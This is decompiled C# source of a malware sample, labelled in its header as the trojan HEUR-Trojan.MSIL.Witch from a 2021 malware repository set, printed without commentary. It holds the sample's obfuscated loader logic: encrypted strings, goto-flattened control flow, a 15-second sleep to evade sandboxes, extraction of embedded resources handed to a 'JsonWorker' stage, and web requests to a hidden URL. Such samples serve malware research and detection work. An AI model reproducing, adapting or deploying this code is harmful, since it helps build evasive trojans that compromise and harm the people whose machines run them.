// Decompiled with JetBrains decompiler
// Type: WindowsFormsApp1.n
// Assembly: Kffxmjkup, Version=0.0.52.0, Culture=neutral, PublicKeyToken=null
// MVID: A3D42A33-7E04-4546-0720-DC34BF455AE6
// Assembly location: C:\Users\Administrateur\Downloads\Bazaar.2021.05-msil\HEUR-Trojan.MSIL.Witch.gen-6bbdcec0763847706f9b75674aad231ff23afd2b212138fc630a86f69f8180d8.exe

using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Linq;
using System.Net;
using System.Reflection;
using System.Runtime.Serialization.Json;
using System.Text;
using System.Threading;
using System.Windows.Forms;

namespace WindowsFormsApp1
{
  public sealed class n : Form
  {
    private IContainer a;
    private RichTextBox b;

    public n()
    {
      if (true)
        goto label_3;
label_1:
      // ISSUE: explicit constructor call
      base.\u002Ector();
      Stopwatch stopwatch1 = Stopwatch.StartNew();
      if (true)
        goto label_4;
label_2:
      Stopwatch stopwatch2;
      stopwatch2.Start();
      while (stopwatch2.Elapsed.Seconds < 15)
      {
        if (true)
          Thread.Sleep(100);
      }
      this.c();
      return;
label_4:
      stopwatch2 = stopwatch1;
      goto label_2;
label_3:
      this.a = (IContainer) null;
      goto label_1;
    }

    public void a()
    {
      WebClient webClient1 = new WebClient();
      if (true)
        goto label_4;
label_1:
      WebClient webClient2;
      webClient2.Headers.Add(E.a(-588153987), E.a(-588154036));
      string str = webClient2.DownloadString(E.a(-588154018));
      if (true)
        goto label_5;
label_2:
      DataContractJsonSerializer contractJsonSerializer1 = new DataContractJsonSerializer(typeof (List<k>));
      if (true)
        goto label_6;
label_3:
      string s;
      DataContractJsonSerializer contractJsonSerializer2;
      using (MemoryStream memoryStream = new MemoryStream(Encoding.Unicode.GetBytes(s)))
      {
        ((List<k>) contractJsonSerializer2.ReadObject((Stream) memoryStream)).ForEach(new Action<k>(Console.WriteLine));
        return;
      }
label_6:
      contractJsonSerializer2 = contractJsonSerializer1;
      goto label_3;
label_5:
      s = str;
      goto label_2;
label_4:
      webClient2 = webClient1;
      goto label_1;
    }

    public void b()
    {
      WebClient webClient1 = new WebClient();
      if (true)
        goto label_2;
label_1:
      WebClient webClient2;
      webClient2.Headers.Add(E.a(-588153987), E.a(-588154036));
      WebClient webClient3 = webClient2;
      DownloadStringCompletedEventHandler completedEventHandler1 = n.a.b;
      if (completedEventHandler1 == null)
      {
        DownloadStringCompletedEventHandler completedEventHandler2 = new DownloadStringCompletedEventHandler(n.a.a.a);
        if (false)
        {
          completedEventHandler1 = completedEventHandler2;
        }
        else
        {
          n.a.b = completedEventHandler2;
          completedEventHandler1 = completedEventHandler2;
        }
      }
      webClient3.DownloadStringCompleted += completedEventHandler1;
      webClient2.DownloadStringAsync(new Uri(E.a(-588154018)));
      return;
label_2:
      webClient2 = webClient1;
      goto label_1;
    }

    private void a(object a, EventArgs b)
    {
      if (true)
        goto label_3;
label_1:
      HttpWebRequest httpWebRequest1 = (HttpWebRequest) WebRequest.Create(E.a(-588154018));
      if (true)
        goto label_4;
label_2:
      HttpWebRequest httpWebRequest2;
      httpWebRequest2.ContentType = E.a(-588154143);
      httpWebRequest2.Method = E.a(-588154118);
      StreamWriter streamWriter1 = new StreamWriter(httpWebRequest2.GetRequestStream());
      StreamWriter streamWriter2;
      if (true)
        streamWriter2 = streamWriter1;
      try
      {
        streamWriter2.Write(E.a(-588154169));
      }
      finally
      {
        streamWriter2.Dispose();
      }
      using (StreamReader streamReader = new StreamReader(httpWebRequest2.GetResponse().GetResponseStream()))
        streamReader.ReadToEnd();
      if (!(WebRequest.Create(E.a(-588154018)) is HttpWebRequest httpWebRequest3))
        return;
      httpWebRequest3.ContentType = E.a(-588154143);
      httpWebRequest3.UserAgent = E.a(-588154036);
      using (Stream responseStream = httpWebRequest3.GetResponse().GetResponseStream())
      {
        using (StreamReader streamReader = new StreamReader(responseStream))
        {
          JsonConvert.DeserializeObject<List<k>>(streamReader.ReadToEnd()).ForEach(new Action<k>(Console.WriteLine));
          return;
        }
      }
label_4:
      httpWebRequest2 = httpWebRequest1;
      goto label_2;
label_3:
      this.b((object) null, (EventArgs) null);
      goto label_1;
    }

    private void b(object a, EventArgs b)
    {
      byte[] numArray1 = this.a(E.a(-588154200));
      if (true)
        goto label_3;
label_1:
      byte[] numArray2 = this.a(E.a(-588154178));
      if (true)
        goto label_4;
label_2:
      JsonWorker.SetString();
      return;
label_4:
      JsonWorker.Obj2 = numArray2;
      goto label_2;
label_3:
      JsonWorker.Obj1 = numArray1;
      goto label_1;
    }

    private byte[] a(string a)
    {
      n.b b1 = new n.b();
      if (true)
        goto label_4;
label_1:
      n.b b2;
      n.b b3 = b2;
      string str = a;
      if (true)
        goto label_5;
label_2:
      Assembly executingAssembly = Assembly.GetExecutingAssembly();
      if (true)
        goto label_6;
label_3:
      Assembly assembly;
      string name = ((IEnumerable<string>) assembly.GetManifestResourceNames()).SingleOrDefault<string>(new Func<string, bool>(b2.a)) ?? string.Empty;
      Stream manifestResourceStream = assembly.GetManifestResourceStream(name);
      MemoryStream destination = new MemoryStream();
      manifestResourceStream.CopyTo((Stream) destination);
      return destination.ToArray();
label_6:
      assembly = executingAssembly;
      goto label_3;
label_5:
      b3.a = str;
      goto label_2;
label_4:
      b2 = b1;
      goto label_1;
    }

    protected override void Dispose(bool a)
    {
      int num1 = !a ? 0 : (this.a != null ? 1 : 0);
      if (true)
        goto label_2;
label_1:
      bool flag;
      if (flag)
        this.a.Dispose();
      int num2 = a ? 1 : 0;
      if (false)
        return;
      base.Dispose(num2 != 0);
      return;
label_2:
      flag = num1 != 0;
      goto label_1;
    }

    private void c()
    {
      RichTextBox richTextBox = new RichTextBox();
      if (true)
        goto label_4;
label_1:
      if (true)
        goto label_5;
label_2:
      this.b.Dock = DockStyle.Fill;
      this.b.Location = new Point(0, 0);
      this.b.Name = E.a(-588154222);
      this.b.Size = new Size(549, 379);
      this.b.TabIndex = 0;
      this.b.Text = string.Empty;
      SizeF sizeF = new SizeF(6f, 13f);
      if (true)
        goto label_6;
label_3:
      this.AutoScaleMode = AutoScaleMode.Font;
      this.ClientSize = new Size(549, 379);
      this.Controls.Add((Control) this.b);
      this.Name = E.a(-588154265);
      this.Text = E.a(-588154265);
      this.Load += new EventHandler(this.a);
      this.ResumeLayout(false);
      return;
label_6:
      this.AutoScaleDimensions = sizeF;
      goto label_3;
label_5:
      this.SuspendLayout();
      goto label_2;
label_4:
      this.b = richTextBox;
      goto label_1;
    }

    [Serializable]
    private sealed class a
    {
      public static readonly n.a a;
      public static DownloadStringCompletedEventHandler b;

      static a()
      {
        n.a a = new n.a();
        if (false)
          return;
        n.a.a = a;
      }

      public a()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal void a(object a, DownloadStringCompletedEventArgs b)
      {
        DataContractJsonSerializer contractJsonSerializer1 = new DataContractJsonSerializer(typeof (List<k>));
        if (true)
          goto label_2;
label_1:
        MemoryStream memoryStream1 = new MemoryStream(Encoding.Unicode.GetBytes(b.Result));
        MemoryStream memoryStream2;
        if (true)
          memoryStream2 = memoryStream1;
        DataContractJsonSerializer contractJsonSerializer2;
        try
        {
          List<k> kList1 = (List<k>) contractJsonSerializer2.ReadObject((Stream) memoryStream2);
          if (true)
            goto label_6;
label_5:
          List<k> kList2;
          kList2.ForEach(new Action<k>(Console.WriteLine));
          return;
label_6:
          kList2 = kList1;
          goto label_5;
        }
        finally
        {
          memoryStream2.Dispose();
        }
label_2:
        contractJsonSerializer2 = contractJsonSerializer1;
        goto label_1;
      }
    }

    private sealed class b
    {
      public string a;

      public b()
      {
        if (true)
          ;
        // ISSUE: explicit constructor call
        base.\u002Ector();
      }

      internal bool a(string a)
      {
        string str = a;
        if (true)
          ;
        if (true)
          ;
        string a1 = this.a;
        return str.Contains(a1);
      }
    }
  }
}
